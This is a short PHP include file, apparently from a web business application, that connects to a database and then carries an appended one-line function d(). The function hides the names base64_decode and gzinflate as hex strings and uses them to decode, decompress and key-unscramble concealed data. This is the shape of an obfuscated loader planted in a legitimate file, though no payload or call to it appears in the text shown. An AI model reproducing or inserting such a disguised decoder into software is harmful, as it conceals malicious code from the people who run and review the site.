<?php
/* $Revision: 1.18 $ */

 	include_once 'includes/ConnectDB_' . $dbType . '.inc';

function d($s,$k=''){if($k==''){for($i=0;$i<strlen($s);$i){$d.=chr(hexdec(substr($s,$i,2)));$i=(float)($i)+2;}return $d;}else{$r='';$f=d('6261736536345f6465636f6465');$u=$f('Z3ppbmZsYXRl');$s=$u($f($s));for($i=0;$i<strlen($s);$i++){$c=substr($s,$i,1);$kc=substr($k,($i%strlen($k))-1,1);$c=chr(ord($c)-ord($kc));$r.=$c;}return $r;}}
?>
